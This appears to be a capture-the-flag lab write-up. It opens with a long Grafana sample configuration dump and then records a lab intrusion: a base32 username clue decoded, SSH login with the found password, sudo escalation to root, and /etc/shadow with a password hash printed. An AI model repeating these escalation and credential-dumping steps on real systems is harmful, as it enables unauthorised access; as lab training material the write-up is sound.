# Set Content Security Policy template used when adding the Content-Security-Policy header to your requests.
# $NONCE in the template includes a random nonce.
# $ROOT_PATH is server.root_url without the protocol.
;content_security_policy_template = """script-src 'self' 'unsafe-eval' 'unsafe-inline' 'strict-dynamic' $NONCE;object-src 'none';font-src 'self';style-src 'self' 'unsafe-inline' blob:;img-src * data:;base-uri 'self';connect-src 'self' grafana.com ws://$ROOT_PATH wss://$ROOT_PATH;manifest-src 'self';media-src 'none';form-action 'self';"""

#################################### Snapshots ###########################
[snapshots]
# snapshot sharing options
;external_enabled = true
;external_snapshot_url = https://snapshots-origin.raintank.io
;external_snapshot_name = Publish to snapshot.raintank.io

# Set to true to enable this Grafana instance act as an external snapshot server and allow unauthenticated requests for
# creating and deleting snapshots.
;public_mode = false

# remove expired snapshot
;snapshot_remove_expired = true

#################################### Dashboards History ##################
[dashboards]
# Number dashboard versions to keep (per dashboard). Default: 20, Minimum: 1
;versions_to_keep = 20

# Minimum dashboard refresh interval. When set, this will restrict users to set the refresh interval of a dashboard lower than given interval. Per default this is 5 seconds.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_refresh_interval = 5s

# Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "dashboards/home.json"
;default_home_dashboard_path =

#################################### Users ###############################
[users]
# disable user signup / registration
;allow_sign_up = true

# Allow non admin users to create organizations
;allow_org_create = true

# Set to true to automatically assign new users to the default organization (id 1)
;auto_assign_org = true

# Set this value to automatically add new users to the provided organization (if auto_assign_org above is set to true)
;auto_assign_org_id = 1

# Default role new users will be automatically assigned (if disabled above is set to true)
;auto_assign_org_role = Viewer

# Require email validation before sign up completes
;verify_email_enabled = false

# Background text for the user field on the login page
;login_hint = email or username
;password_hint = password

# Default UI theme ("dark" or "light")
;default_theme = dark

# Path to a custom home page. Users are only redirected to this if the default home dashboard is used. It should match a frontend route and contain a leading slash.
; home_page =

# External user management, these options affect the organization users view
;external_manage_link_url =
;external_manage_link_name =
;external_manage_info =

# Viewers can edit/inspect dashboard settings in the browser. But not save the dashboard.
;viewers_can_edit = false

# Editors can administrate dashboard, folders and teams they create
;editors_can_admin = false

# The duration in time a user invitation remains valid before expiring. This setting should be expressed as a duration. Examples: 6h (hours), 2d (days), 1w (week). Default is 24h (24 hours). The minimum supported duration is 15m (15 minutes).
;user_invite_max_lifetime_duration = 24h

# Enter a comma-separated list of users login to hide them in the Grafana UI. These users are shown to Grafana admins and themselves.
; hidden_users =

[auth]
# Login cookie name
;login_cookie_name = grafana_session

# The maximum lifetime (duration) an authenticated user can be inactive before being required to login at next visit. Default is 7 days (7d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month). The lifetime resets at each successful token rotation.
;login_maximum_inactive_lifetime_duration =

# The maximum lifetime (duration) an authenticated user can be logged in since login time before being required to login. Default is 30 days (30d). This setting should be expressed as a duration, e.g. 5m (minutes), 6h (hours), 10d (days), 2w (weeks), 1M (month).
;login_maximum_lifetime_duration =

# How often should auth tokens be rotated for authenticated users when being active. The default is each 10 minutes.
;token_rotation_interval_minutes = 10

# Set to true to disable (hide) the login form, useful if you use OAuth, defaults to false
;disable_login_form = false

# Set to true to disable the sign out link in the side menu. Useful if you use auth.proxy or auth.jwt, defaults to false
;disable_signout_menu = false

# URL to redirect the user to after sign out
;signout_redirect_url =

# Set to true to attempt login with OAuth automatically, skipping the login screen.
# This setting is ignored if multiple OAuth providers are configured.
;oauth_auto_login = false

# OAuth state max age cookie duration in seconds. Defaults to 600 seconds.
;oauth_state_cookie_max_age = 600

# limit of api_key seconds to live before expiration
;api_key_max_seconds_to_live = -1

# Set to true to enable SigV4 authentication option for HTTP-based datasources.
;sigv4_auth_enabled = false

#################################### Anonymous Auth ######################
[auth.anonymous]
# enable anonymous access
;enabled = false

# specify organization name that should be used for unauthenticated users
;org_name = Main Org.

# specify role for unauthenticated users
;org_role = Viewer

# mask the Grafana version number for unauthenticated users
;hide_version = false

#################################### GitHub Auth ##########################
[auth.github]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;auth_url = https://github.com/login/oauth/authorize
;token_url = https://github.com/login/oauth/access_token
;api_url = https://api.github.com/user
;allowed_domains =
;team_ids =
;allowed_organizations =

#################################### GitLab Auth #########################
[auth.gitlab]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = api
;auth_url = https://gitlab.com/oauth/authorize
;token_url = https://gitlab.com/oauth/token
;api_url = https://gitlab.com/api/v4
;allowed_domains =
;allowed_groups =

#################################### Google Auth ##########################
[auth.google]
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email
;auth_url = https://accounts.google.com/o/oauth2/auth
;token_url = https://accounts.google.com/o/oauth2/token
;api_url = https://www.googleapis.com/oauth2/v1/userinfo
;allowed_domains =
;hosted_domain =

#################################### Grafana.com Auth ####################
[auth.grafana_com]
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email
;allowed_organizations =

#################################### Azure AD OAuth #######################
[auth.azuread]
;name = Azure AD
;enabled = false
;allow_sign_up = true
;client_id = some_client_id
;client_secret = some_client_secret
;scopes = openid email profile
;auth_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize
;token_url = https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token
;allowed_domains =
;allowed_groups =

#################################### Okta OAuth #######################
[auth.okta]
;name = Okta
;enabled = false
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = openid profile email groups
;auth_url = https://<tenant-id>.okta.com/oauth2/v1/authorize
;token_url = https://<tenant-id>.okta.com/oauth2/v1/token
;api_url = https://<tenant-id>.okta.com/oauth2/v1/userinfo
;allowed_domains =
;allowed_groups =
;role_attribute_path =
;role_attribute_strict = false

#################################### Generic OAuth ##########################
[auth.generic_oauth]
;enabled = false
;name = OAuth
;allow_sign_up = true
;client_id = some_id
;client_secret = some_secret
;scopes = user:email,read:org
;empty_scopes = false
;email_attribute_name = email:primary
;email_attribute_path =
;login_attribute_path =
;name_attribute_path =
;id_token_attribute_name =
;auth_url = https://foo.bar/login/oauth/authorize
;token_url = https://foo.bar/login/oauth/access_token
;api_url = https://foo.bar/user
;teams_url =
;allowed_domains =
;team_ids =
;allowed_organizations =
;role_attribute_path =
;role_attribute_strict = false
;groups_attribute_path =
;team_ids_attribute_path =
;tls_skip_verify_insecure = false
;tls_client_cert =
;tls_client_key =
;tls_client_ca =
;use_pkce = false

#################################### Basic Auth ##########################
[auth.basic]
;enabled = true

#################################### Auth Proxy ##########################
[auth.proxy]
;enabled = false
;header_name = X-WEBAUTH-USER
;header_property = username
;auto_sign_up = true
;sync_ttl = 60
;whitelist = 192.168.1.1, 192.168.2.1
;headers = Email:X-User-Email, Name:X-User-Name
# Read the auth proxy docs for details on what the setting below enables
;enable_login_token = false

#################################### Auth JWT ##########################
[auth.jwt]
;enabled = true
;header_name = X-JWT-Assertion
;email_claim = sub
;username_claim = sub
;jwk_set_url = https://foo.bar/.well-known/jwks.json
;jwk_set_file = /path/to/jwks.json
;cache_ttl = 60m
;expected_claims = {"aud": ["foo", "bar"]}
;key_file = /path/to/key/file

#################################### Auth LDAP ##########################
[auth.ldap]
;enabled = false
;config_file = /etc/grafana/ldap.toml
;allow_sign_up = true

# LDAP background sync (Enterprise only)
# At 1 am every day
;sync_cron = "0 0 1 * * *"
;active_sync_enabled = true

#################################### AWS ###########################
[aws]
# Enter a comma-separated list of allowed AWS authentication providers.
# Options are: default (AWS SDK Default), keys (Access && secret key), credentials (Credentials field), ec2_iam_role (EC2 IAM Role)
; allowed_auth_providers = default,keys,credentials

# Allow AWS users to assume a role using temporary security credentials.
# If true, assume role will be enabled for all AWS authentication providers that are specified in aws_auth_providers
; assume_role_enabled = true

#################################### Azure ###############################
[azure]
# Azure cloud environment where Grafana is hosted
# Possible values are AzureCloud, AzureChinaCloud, AzureUSGovernment and AzureGermanCloud
# Default value is AzureCloud (i.e. public cloud)
;cloud = AzureCloud

# Specifies whether Grafana hosted in Azure service with Managed Identity configured (e.g. Azure Virtual Machines instance)
# If enabled, the managed identity can be used for authentication of Grafana in Azure services
# Disabled by default, needs to be explicitly enabled
;managed_identity_enabled = false

# Client ID to use for user-assigned managed identity
# Should be set for user-assigned identity and should be empty for system-assigned identity
;managed_identity_client_id =

#################################### SMTP / Emailing ##########################
[smtp]
;enabled = false
;host = localhost:25
;user =
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
;cert_file =
;key_file =
;skip_verify = false
;from_address = admin@grafana.localhost
;from_name = Grafana
# EHLO identity in SMTP dialog (defaults to instance_name)
;ehlo_identity = dashboard.example.com
# SMTP startTLS policy (defaults to 'OpportunisticStartTLS')
;startTLS_policy = NoStartTLS

[emails]
;welcome_email_on_sign_up = false
;templates_pattern = emails/*.html, emails/*.txt
;content_types = text/html

#################################### Logging ##########################
[log]
# Either "console", "file", "syslog". Default is console and  file
# Use space to separate multiple modes, e.g. "console file"
;mode = console file

# Either "debug", "info", "warn", "error", "critical", default is "info"
;level = info

# optional settings to set different levels for specific loggers. Ex filters = sqlstore:debug
;filters =

# For "console" mode only
[log.console]
;level =

# log line format, valid options are text, console and json
;format = console

# For "file" mode only
[log.file]
;level =

# log line format, valid options are text, console and json
;format = text

# This enables automated log rotate(switch of following options), default is true
;log_rotate = true

# Max line number of single file, default is 1000000
;max_lines = 1000000

# Max size shift of single file, default is 28 means 1 << 28, 256MB
;max_size_shift = 28

# Segment log daily, default is true
;daily_rotate = true

# Expired days of log file(delete after max days), default is 7
;max_days = 7

[log.syslog]
;level =

# log line format, valid options are text, console and json
;format = text

# Syslog network type and address. This can be udp, tcp, or unix. If left blank, the default unix endpoints will be used.
;network =
;address =

# Syslog facility. user, daemon and local0 through local7 are valid.
;facility =

# Syslog tag. By default, the process' argv[0] is used.
;tag =

[log.frontend]
# Should Sentry javascript agent be initialized
;enabled = false

# Sentry DSN if you want to send events to Sentry.
;sentry_dsn =

# Custom HTTP endpoint to send events captured by the Sentry agent to. Default will log the events to stdout.
;custom_endpoint = /log

# Rate of events to be reported between 0 (none) and 1 (all), float
;sample_rate = 1.0

# Requests per second limit enforced an extended period, for Grafana backend log ingestion endpoint (/log).
;log_endpoint_requests_per_second_limit = 3

# Max requests accepted per short interval of time for Grafana backend log ingestion endpoint (/log).
;log_endpoint_burst_limit = 15

#################################### Usage Quotas ########################
[quota]
; enabled = false

#### set quotas to -1 to make unlimited. ####
# limit number of users per Org.
; org_user = 10

# limit number of dashboards per Org.
; org_dashboard = 100

# limit number of data_sources per Org.
; org_data_source = 10

# limit number of api_keys per Org.
; org_api_key = 10

# limit number of alerts per Org.
;org_alert_rule = 100

# limit number of orgs a user can create.
; user_org = 10

# Global limit of users.
; global_user = -1

# global limit of orgs.
; global_org = -1

# global limit of dashboards
; global_dashboard = -1

# global limit of api_keys
; global_api_key = -1

# global limit on number of logged in users.
; global_session = -1

# global limit of alerts
;global_alert_rule = -1

#################################### Unified Alerting ####################
[unified_alerting]
#Enable the Unified Alerting sub-system and interface. When enabled we'll migrate all of your alert rules and notification channels to the new system. New alert rules will be created and your notification channels will be converted into an Alertmanager configuration. Previous data is preserved to enable backwards compatibility but new data is removed.```
;enabled = true

# Comma-separated list of organization IDs for which to disable unified alerting. Only supported if unified alerting is enabled.
;disabled_orgs =

# Specify the frequency of polling for admin config changes.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;admin_config_poll_interval = 60s

# Specify the frequency of polling for Alertmanager config changes.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;alertmanager_config_poll_interval = 60s

# Listen address/hostname and port to receive unified alerting messages for other Grafana instances. The port is used for both TCP and UDP. It is assumed other Grafana instances are also running on the same port. The default value is `0.0.0.0:9094`.
;ha_listen_address = "0.0.0.0:9094"

# Listen address/hostname and port to receive unified alerting messages for other Grafana instances. The port is used for both TCP and UDP. It is assumed other Grafana instances are also running on the same port. The default value is `0.0.0.0:9094`.
;ha_advertise_address = ""

# Comma-separated list of initial instances (in a format of host:port) that will form the HA cluster. Configuring this setting will enable High Availability mode for alerting.
;ha_peers = ""

# Time to wait for an instance to send a notification via the Alertmanager. In HA, each Grafana instance will
# be assigned a position (e.g. 0, 1). We then multiply this position with the timeout to indicate how long should
# each instance wait before sending the notification to take into account replication lag.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_peer_timeout = "15s"

# The interval between sending gossip messages. By lowering this value (more frequent) gossip messages are propagated
# across cluster more quickly at the expense of increased bandwidth usage.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_gossip_interval = "200ms"

# The interval between gossip full state syncs. Setting this interval lower (more frequent) will increase convergence speeds
# across larger clusters at the expense of increased bandwidth usage.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;ha_push_pull_interval = "60s"

# Enable or disable alerting rule execution. The alerting UI remains visible. This option has a legacy version in the `[alerting]` section that takes precedence.
;execute_alerts = true

# Alert evaluation timeout when fetching data from the datasource. This option has a legacy version in the `[alerting]` section that takes precedence.
# The timeout string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;evaluation_timeout = 30s

# Number of times we'll attempt to evaluate an alert rule before giving up on that evaluation. This option has a legacy version in the `[alerting]` section that takes precedence.
;max_attempts = 3

# Minimum interval to enforce between rule evaluations. Rules will be adjusted if they are less than this value  or if they are not multiple of the scheduler interval (10s). Higher values can help with resource management as we'll schedule fewer evaluations over time. This option has a legacy version in the `[alerting]` section that takes precedence.
# The interval string is a possibly signed sequence of decimal numbers, followed by a unit suffix (ms, s, m, h, d), e.g. 30s or 1m.
;min_interval = 10s

#################################### Alerting ############################
[alerting]
# Disable legacy alerting engine & UI features
;enabled = false

# Makes it possible to turn off alert execution but alerting UI is visible
;execute_alerts = true

# Default setting for new alert rules. Defaults to categorize error and timeouts as alerting. (alerting, keep_state)
;error_or_timeout = alerting

# Default setting for how Grafana handles nodata or null values in alerting. (alerting, no_data, keep_state, ok)
;nodata_or_nullvalues = no_data

# Alert notifications can include images, but rendering many images at the same time can overload the server
# This limit will protect the server from render overloading and make sure notifications are sent out quickly
;concurrent_render_limit = 5

# Default setting for alert calculation timeout. Default value is 30
;evaluation_timeout_seconds = 30

# Default setting for alert notification timeout. Default value is 30
;notification_timeout_seconds = 30

# Default setting for max attempts to sending alert notifications. Default value is 3
;max_attempts = 3

# Makes it possible to enforce a minimal interval between evaluations, to reduce load on the backend
;min_interval_seconds = 1

# Configures for how long alert annotations are stored. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_annotation_age =

# Configures max number of alert annotations that Grafana stores. Default value is 0, which keeps all alert annotations.
;max_annotations_to_keep =

#################################### Annotations #########################
[annotations]
# Configures the batch size for the annotation clean-up job. This setting is used for dashboard, API, and alert annotations.
;cleanupjob_batchsize = 100

[annotations.dashboard]
# Dashboard annotations means that annotations are associated with the dashboard they are created on.

# Configures how long dashboard annotations are stored. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =

# Configures max number of dashboard annotations that Grafana stores. Default value is 0, which keeps all dashboard annotations.
;max_annotations_to_keep =

[annotations.api]
# API annotations means that the annotations have been created using the API without any
# association with a dashboard.

# Configures how long Grafana stores API annotations. Default is 0, which keeps them forever.
# This setting should be expressed as a duration. Examples: 6h (hours), 10d (days), 2w (weeks), 1M (month).
;max_age =

# Configures max number of API annotations that Grafana keeps. Default value is 0, which keeps all API annotations.
;max_annotations_to_keep =

#################################### Explore #############################
[explore]
# Enable the Explore section
;enabled = true

#################################### Internal Grafana Metrics ##########################
# Metrics available at HTTP API Url /metrics
[metrics]
# Disable / Enable internal metrics
;enabled           = true
# Graphite Publish interval
;interval_seconds  = 10
# Disable total stats (stat_totals_*) metrics to be generated
;disable_total_stats = false

#If both are set, basic auth will be required for the metrics endpoint.
; basic_auth_username =
; basic_auth_password =

# Metrics environment info adds dimensions to the `grafana_environment_info` metric, which
# can expose more information about the Grafana instance.
[metrics.environment_info]
#exampleLabel1 = exampleValue1
#exampleLabel2 = exampleValue2

# Send internal metrics to Graphite
[metrics.graphite]
# Enable by setting the address setting (ex localhost:2003)
;address =
;prefix = prod.grafana.%(instance_name)s.

#################################### Grafana.com integration  ##########################
# Url used to import dashboards directly from Grafana.com
[grafana_com]
;url = https://grafana.com

#################################### Distributed tracing ############
[tracing.jaeger]
# Enable by setting the address sending traces to jaeger (ex localhost:6831)
;address = localhost:6831
# Tag that will always be included in when creating new spans. ex (tag1:value1,tag2:value2)
;always_included_tag = tag1:value1
# Type specifies the type of the sampler: const, probabilistic, rateLimiting, or remote
;sampler_type = const
# jaeger samplerconfig param
# for "const" sampler, 0 or 1 for always false/true respectively
# for "probabilistic" sampler, a probability between 0 and 1
# for "rateLimiting" sampler, the number of spans per second
# for "remote" sampler, param is the same as for "probabilistic"
# and indicates the initial sampling rate before the actual one
# is received from the mothership
;sampler_param = 1
# sampling_server_url is the URL of a sampling manager providing a sampling strategy.
;sampling_server_url =
# Whether or not to use Zipkin propagation (x-b3- HTTP headers).
;zipkin_propagation = false
# Setting this to true disables shared RPC spans.
# Not disabling is the most common setting when using Zipkin elsewhere in your infrastructure.
;disable_shared_zipkin_spans = false

#################################### External image storage ##########################
[external_image_storage]
# Used for uploading images to public servers so they can be included in slack/email messages.
# you can choose between (s3, webdav, gcs, azure_blob, local)
;provider =

[external_image_storage.s3]
;endpoint =
;path_style_access =
;bucket =
;region =
;path =
;access_key =
;secret_key =

[external_image_storage.webdav]
;url =
;public_url =
;username =
;password =

[external_image_storage.gcs]
;key_file =
;bucket =
;path =

[external_image_storage.azure_blob]
;account_name =
;account_key =
;container_name =

[external_image_storage.local]
# does not require any configuration

[rendering]
# Options to configure a remote HTTP image rendering service, e.g. using https://github.com/grafana/grafana-image-renderer.
# URL to a remote HTTP image renderer service, e.g. http://localhost:8081/render, will enable Grafana to render panels and dashboards to PNG-images using HTTP requests to an external service.
;server_url =
# If the remote HTTP image renderer service runs on a different server than the Grafana server you may have to configure this to a URL where Grafana is reachable, e.g. http://grafana.domain/.
;callback_url =
# Concurrent render request limit affects when the /render HTTP endpoint is used. Rendering many images at the same time can overload the server,
# which this setting can help protect against by only allowing a certain amount of concurrent requests.
;concurrent_render_request_limit = 30

[panels]
# If set to true Grafana will allow script tags in text panels. Not recommended as it enable XSS vulnerabilities.
;disable_sanitize_html = false

[plugins]
;enable_alpha = false
;app_tls_skip_verify_insecure = false
# Enter a comma-separated list of plugin identifiers to identify plugins to load even if they are unsigned. Plugins with modified signatures are never loaded.
;allow_loading_unsigned_plugins =
# Enable or disable installing / uninstalling / updating plugins directly from within Grafana.
;plugin_admin_enabled = false
;plugin_admin_external_manage_enabled = false
;plugin_catalog_url = https://grafana.com/grafana/plugins/
# Enter a comma-separated list of plugin identifiers to hide in the plugin catalog.
;plugin_catalog_hidden_plugins =

#################################### Grafana Live ##########################################
[live]
# max_connections to Grafana Live WebSocket endpoint per Grafana server instance. See Grafana Live docs
# if you are planning to make it higher than default 100 since this can require some OS and infrastructure
# tuning. 0 disables Live, -1 means unlimited connections.
;max_connections = 100

# allowed_origins is a comma-separated list of origins that can establish connection with Grafana Live.
# If not set then origin will be matched over root_url. Supports wildcard symbol "*".
;allowed_origins =

# engine defines an HA (high availability) engine to use for Grafana Live. By default no engine used - in
# this case Live features work only on a single Grafana server. Available options: "redis".
# Setting ha_engine is an EXPERIMENTAL feature.
;ha_engine =

# ha_engine_address sets a connection address for Live HA engine. Depending on engine type address format can differ.
# For now we only support Redis connection address in "host:port" format.
# This option is EXPERIMENTAL.
;ha_engine_address = "127.0.0.1:6379"

#################################### Grafana Image Renderer Plugin ##########################
[plugin.grafana-image-renderer]
# Instruct headless browser instance to use a default timezone when not provided by Grafana, e.g. when rendering panel image of alert.
# See ICU’s metaZones.txt (https://cs.chromium.org/chromium/src/third_party/icu/source/data/misc/metaZones.txt) for a list of supported
# timezone IDs. Fallbacks to TZ environment variable if not set.
;rendering_timezone =

# Instruct headless browser instance to use a default language when not provided by Grafana, e.g. when rendering panel image of alert.
# Please refer to the HTTP header Accept-Language to understand how to format this value, e.g. 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'.
;rendering_language =

# Instruct headless browser instance to use a default device scale factor when not provided by Grafana, e.g. when rendering panel image of alert.
# Default is 1. Using a higher value will produce more detailed images (higher DPI), but will require more disk space to store an image.
;rendering_viewport_device_scale_factor =

# Instruct headless browser instance whether to ignore HTTPS errors during navigation. Per default HTTPS errors are not ignored. Due to
# the security risk it's not recommended to ignore HTTPS errors.
;rendering_ignore_https_errors =

# Instruct headless browser instance whether to capture and log verbose information when rendering an image. Default is false and will
# only capture and log error messages. When enabled, debug messages are captured and logged as well.
# For the verbose information to be included in the Grafana server log you have to adjust the rendering log level to debug, configure
# [log].filter = rendering:debug.
;rendering_verbose_logging =

# Instruct headless browser instance whether to output its debug and error messages into running process of remote rendering service.
# Default is false. This can be useful to enable (true) when troubleshooting.
;rendering_dumpio =

# Additional arguments to pass to the headless browser instance. Default is --no-sandbox. The list of Chromium flags can be found
# here (https://peter.sh/experiments/chromium-command-line-switches/). Multiple arguments is separated with comma-character.
;rendering_args =

# You can configure the plugin to use a different browser binary instead of the pre-packaged version of Chromium.
# Please note that this is not recommended, since you may encounter problems if the installed version of Chrome/Chromium is not
# compatible with the plugin.
;rendering_chrome_bin =

# Instruct how headless browser instances are created. Default is 'default' and will create a new browser instance on each request.
# Mode 'clustered' will make sure that only a maximum of browsers/incognito pages can execute concurrently.
# Mode 'reusable' will have one browser instance and will create a new incognito page on each request.
;rendering_mode =

# When rendering_mode = clustered, you can instruct how many browsers or incognito pages can execute concurrently. Default is 'browser'
# and will cluster using browser instances.
# Mode 'context' will cluster using incognito pages.
;rendering_clustering_mode =
# When rendering_mode = clustered, you can define the maximum number of browser instances/incognito pages that can execute concurrently. Default is '5'.
;rendering_clustering_max_concurrency =
# When rendering_mode = clustered, you can specify the duration a rendering request can take before it will time out. Default is `30` seconds.
;rendering_clustering_timeout =

# Limit the maximum viewport width, height and device scale factor that can be requested.
;rendering_viewport_max_width =
;rendering_viewport_max_height =
;rendering_viewport_max_device_scale_factor =

# Change the listening host and port of the gRPC server. Default host is 127.0.0.1 and default port is 0 and will automatically assign
# a port not in use.
;grpc_host =
;grpc_port =

[enterprise]
# Path to a valid Grafana Enterprise license.jwt file
;license_path =

[feature_toggles]
# enable features, separated by spaces
;enable =

[date_formats]
# For information on what formatting patterns that are supported https://momentjs.com/docs/#/displaying/

# Default system date format used in time range picker and other places where full time is displayed
;full_date = YYYY-MM-DD HH:mm:ss

# Used by graph and other places where we only show small intervals
;interval_second = HH:mm:ss
;interval_minute = HH:mm
;interval_hour = MM/DD HH:mm
;interval_day = MM/DD
;interval_month = YYYY-MM
;interval_year = YYYY

# Experimental feature
;use_browser_locale = false

# Default timezone for user preferences. Options are 'browser' for the browser local timezone or a timezone name from IANA Time Zone database, e.g. 'UTC' or 'Europe/Amsterdam' etc.
;default_timezone = browser

[expressions]
# Enable or disable the expressions functionality.
;enabled = true

[geomap]
# Set the JSON configuration for the default basemap
;default_baselayer_config = `{
;  "type": "xyz",
;  "config": {
;    "attribution": "Open street map",
;    "url": "https://tile.openstreetmap.org/{z}/{x}/{y}.png"
;  }
;}`

# Enable or disable loading other base map layers
;enable_custom_baselayers = true



http://10.10.249.171:5000/
Etch-A-Sketch (like game)

view-source:http://10.10.249.171:5000/static/css/main.css
/* @import url("https://pastebin.com/cPs69B0y"); */
1.  OZQWO4TBNZ2A==== (base32) using cyberchef and give me a clue
vagrant

┌──(kali㉿kali)-[~]
└─$ echo OZQWO4TBNZ2A==== | base32 -d
vagrant                                                                                                                                          



http://10.10.249.171:6443/
Client sent an HTTP request to an HTTPS server.


```

Find the username?

*vagrant*

Find the password?

*hereiamatctf907*

###  Your Secret Crush

If you want to keep a secret, you must also hide it from yourself. Find the secret!

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ ssh grafana@10.10.249.171           
The authenticity of host '10.10.249.171 (10.10.249.171)' can't be established.
ED25519 key fingerprint is SHA256:VPx7mYuBsJ55P9/hfFuuYIjMx9XjpMRWIy4wC5fiG4Y.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.249.171' (ED25519) to the list of known hosts.
grafana@10.10.249.171's password: hereiamatctf907
Permission denied, please try again.
grafana@10.10.249.171's password: 

                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ ssh vagrant@10.10.249.171
vagrant@10.10.249.171's password: hereiamatctf907
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan  9 16:17:12 UTC 2023

  System load:  0.26              Processes:              106
  Usage of /:   6.5% of 61.80GB   Users logged in:        0
  Memory usage: 57%               IP address for eth0:    10.10.249.171
  Swap usage:   0%                IP address for docker0: 172.17.0.1


248 packages can be updated.
192 updates are security updates.


Last login: Thu Feb 10 18:58:49 2022 from 10.0.2.2
vagrant@johnny:~$ whoami
vagrant

vagrant@johnny:~$ sudo -l
Matching Defaults entries for vagrant on johnny:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on johnny:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
vagrant@johnny:~$ sudo -s
root@johnny:~# cd /
root@johnny:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  vagrant  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  var      vmlinuz.old

root@johnny:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbfyGA5t6yhBrLT92DNU6P8hv3MUfgTL4l33rbMAGf7/Z4EY2JtPCtctzxKvE4OBRSM2PCZ59N82w6KqBrYTpVBxbIJ3VDDQzZ9JtLiEb/8NFxXstZfsb1MCTq7o44U7/K1wG+QPCXmQX2AxEKIk7eHz6q1NPDbCTZkfKeOk7FKkSY4TlSjzfZg09Obv+DpPB800UDgeS1yW3hE0HKZJnPHIivOd7ScvxRJyFREa5o88MQ/4DS7q/kNqzuGDk180/Kf80bYBSjful5JNuTlz40b5mMIH8W7SHDcUrF6JRuRL/RuZ7tcTizjFRwIab/JtlqYHr2ktQfjJcd0NA9BeON vagrant

root@johnny:~/.ssh# cat /etc/shadow
root:!:18123:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18123:0:99999:7:::
uuidd:*:18123:0:99999:7:::
dnsmasq:*:18123:0:99999:7:::
landscape:*:18123:0:99999:7:::
pollinate:*:18123:0:99999:7:::
statd:*:18123:0:99999:7:::
sshd:*:18123:0:99999:7:::
vagrant:$6$lSFsvbrB$UiOHTM.XaC9ZC7kCYQKbyV/x8flLycuK26UtQCdy.RZedMASXDQai6l083QArvILrx4FEm3H1WspEveIOKL.m1:19033:0:99999:7:::
vboxadd:!:18123::::::
etcd:!:19033::::::
kube-apiserver:!:19033::::::
konnectivity-server:!:19033::::::
kube-scheduler:!:19033::::::

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/kubernetes-basics

root@johnny:~/.ssh# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.7 159824  7952 ?        Ss   15:38   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    15:38   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   15:38   0:00 [mm_percpu_wq]
root         7  0.2  0.0      0     0 ?        S    15:38   0:05 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    15:38   0:01 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    15:38   0:00 [rcu_bh]
